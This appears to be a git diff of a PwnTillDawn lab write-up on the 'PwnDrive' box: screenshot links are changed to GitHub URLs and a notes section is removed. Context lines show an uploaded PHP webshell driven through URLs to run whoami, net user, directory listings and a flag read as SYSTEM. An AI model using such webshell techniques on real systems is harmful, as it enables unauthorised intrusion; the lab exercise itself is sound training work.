@@ -183,13 +183,13 @@ After logging in as `testuser` (admin role), the application allows file uploads
 
 ### Screenshot — Successful Upload
 
-![file-uploaded](pwntilldawn_10.png)
+![file-uploaded](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2010.png)
 
 > `File Uploaded Successfully!` — `cmd.php` is now listed in personal files.
 
 ### Screenshot — Upload Directory (`/upload/`)
 
-![upload-index](pwntilldawn_6.png)
+![upload-index](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/main/pwntilldawn%206.png)
 
 ```
 /upload/2/    2026-04-22 01:16
@@ -200,7 +200,7 @@ The webshell lands in a numbered user folder, e.g., `/upload/11/cmd.php`:
 
 ### Screenshot — `/upload/11/` Index
 
-![upload-11](pwntilldawn_11.png)
+![upload-11](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2011.png)
 
 ```
 /upload/11/cmd.php   2024-03-21 06:24   31 bytes
@@ -227,7 +227,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=whoami
 
 #### Screenshot
 
-![whoami](pwntilldawn_12.png)
+![whoami](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/main/pwntilldawn%2012.png)
 
 ```
 nt authority\system
@@ -245,7 +245,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=hostname
 
 #### Screenshot
 
-![hostname](pwntilldawn_13.png)
+![hostname](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2013.png)
 
 ```
 PwnDrive
@@ -261,7 +261,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=net+user
 
 #### Screenshot
 
-![net-user](pwntilldawn_14.png)
+![net-user](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2014.png)
 
 ```
 User accounts for \\
@@ -279,7 +279,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users
 
 #### Screenshot
 
-![dir-users](pwntilldawn_15.png)
+![dir-users](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2015.png)
 
 ```
 Directory of C:\Users
@@ -302,7 +302,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users\Administrator
 
 #### Screenshot
 
-![dir-admin](pwntilldawn_16.png)
+![dir-admin](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2016.png)
 
 ```
 Contacts    11/17/2020 07:19 AM
@@ -328,7 +328,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users\Administrator\Desktop
 
 #### Screenshot
 
-![dir-desktop](pwntilldawn_17.png)
+![dir-desktop](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2017.png)
 
 ```
 11/17/2020  07:19 AM    .
@@ -352,7 +352,7 @@ http://10.150.150.11/upload/11/cmd.php?cmd=type+C:\Users\Administrator\Desktop\F
 
 ### Screenshot — Flag
 
-![flag](pwntilldawn_18.png)
+![flag](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2018.png)
 
 ```
 PwnTillDawnAcademyIsAwesome!!!
@@ -409,14 +409,5 @@ type FLAG1.txt ──► PwnTillDawnAcademyIsAwesome!!!
 | MariaDB & MSSQL Exposed | Medium | Ports 3306, 1433 |
 | Outdated SQL Server (2012 RTM, no patches) | High | Port 1433 |
 
----
-
-## 📌 Notes
-
-- The web application (PwnDrive) runs under `nt authority\system`, meaning any webshell execution immediately yields SYSTEM-level access — no privilege escalation step required.
-- The `/admin/` panel has no authentication enforcement on the directory listing or user creation form when accessed directly via URL.
-- The file upload feature stores files in a predictable numbered path (`/upload/<user_id>/`) with **direct web access** and **no PHP execution restriction**.
-
----
 
 *Writeup by: [Your Name] | Platform: PwnTillDawn Academy*
